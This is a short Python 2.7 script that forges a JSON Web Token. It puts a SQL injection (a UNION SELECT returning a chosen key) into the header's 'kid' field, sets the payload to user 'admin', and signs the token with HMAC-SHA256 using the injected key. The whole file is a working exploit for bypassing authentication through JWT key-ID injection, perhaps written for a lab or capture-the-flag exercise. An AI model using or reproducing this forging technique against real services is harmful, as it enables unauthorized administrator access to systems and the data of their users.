#!/usr/bin/env python2.7

import base64
import hmac
import hashlib


header = '{"typ":"JWT","alg":"HS256","kid":"randomzdddzstring\'UNION SELECT \'keyvalue"}'
payload = '{"user":"admin"}'
key = "keyvalue"

modifheaderb64 = ((base64.b64encode(header.encode('utf-8'))).decode('utf-8')).rstrip("=")
payloadb64 = ((base64.b64encode(payload.encode('utf-8'))).decode('utf-8')).rstrip("=")
        
headPay = modifheaderb64+"."+payloadb64

signature = base64.b64encode(hmac.new(key,headPay,hashlib.sha256).digest()).decode('utf-8').rstrip("=")

jwt = modifheaderb64 + '.' + payloadb64 + '.' + signature

print (jwt)
